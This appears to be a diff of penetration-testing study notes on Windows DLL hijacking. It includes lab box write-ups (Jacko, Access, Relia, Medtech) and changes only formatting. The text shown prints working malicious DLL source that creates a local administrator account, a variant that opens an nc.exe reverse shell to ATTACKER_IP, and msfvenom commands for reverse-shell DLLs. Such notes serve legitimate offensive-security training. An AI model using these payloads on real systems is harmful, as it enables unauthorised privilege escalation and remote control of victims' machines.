@@ -25,10 +25,10 @@ Malicious DLL source -- save as `hijack.c` on Kali:
 ```c
 #include <windows.h>
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
-    if (fdwReason == DLL_PROCESS_ATTACH) {
-        system("cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add");
-    }
-    return TRUE;
+ if (fdwReason == DLL_PROCESS_ATTACH) {
+ system("cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add");
+ }
+ return TRUE;
 }
 ```
 
@@ -36,10 +36,10 @@ Reverse shell variant:
 ```c
 #include <windows.h>
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
-    if (fdwReason == DLL_PROCESS_ATTACH) {
-        system("cmd.exe /c C:\\tmp\\nc.exe ATTACKER_IP 443 -e cmd.exe");
-    }
-    return TRUE;
+ if (fdwReason == DLL_PROCESS_ATTACH) {
+ system("cmd.exe /c C:\\tmp\\nc.exe ATTACKER_IP 443 -e cmd.exe");
+ }
+ return TRUE;
 }
 ```
 
@@ -54,18 +54,18 @@ Place `hijack.dll` (renamed to the missing DLL name) in a writable directory in 
 
 ## From Your Boxes
 
-> **Jacko** (PG) — FJTWSVIC service (PaperStream IP) had DLL hijack vulnerability (CVE-49382)
+> **Jacko** (PG) - FJTWSVIC service (PaperStream IP) had DLL hijack vulnerability (CVE-49382)
 > - What worked: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f dll -a x86 --platform windows -o UninOldIs.dll`, then ran PowerShell exploit to place DLL and restart service
 > - Lesson: Search exploit-db for known DLL hijack CVEs for installed software. The exploit script handles placement and restart.
 
-> **Access** (PG) — SeManageVolumePrivilege allowed modifying system DLL directories, hijacked tzres.dll
+> **Access** (PG) - SeManageVolumePrivilege allowed modifying system DLL directories, hijacked tzres.dll
 > - What worked: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=53 -f dll -o tzres.dll`, placed in C:\Windows\System32\wbem\, then ran `systeminfo` to trigger load
 > - Lesson: tzres.dll loads when you run systeminfo. Useful when you have write access to system directories.
 
-> **Relia Host 248** (Course) — BetaMonitor service logging "Couldn't find BetaLibrary.Dll"
+> **Relia Host 248** (Course) - BetaMonitor service logging "Couldn't find BetaLibrary.Dll"
 > - What worked: Identified missing DLL from log file, checked PATH order for writable directory, compiled malicious DLL with mingw: `x86_64-w64-mingw32-gcc myDLL.cpp --shared -o BetaLibrary.dll`
 > - Lesson: Check application log files for "DLL not found" messages. The PATH search order determines where to place your payload.
 
-> **Medtech CLIENT02** (Course) — WinPEAS flagged "Possible DLL Hijacking in binary folder: C:\DevelopmentExecutables"
+> **Medtech CLIENT02** (Course) - WinPEAS flagged "Possible DLL Hijacking in binary folder: C:\DevelopmentExecutables"
 > - What worked: Everyone [AllAccess] on the folder allowed dropping a malicious DLL
 > - Lesson: WinPEAS explicitly flags DLL hijack opportunities with permission info. Trust its output.
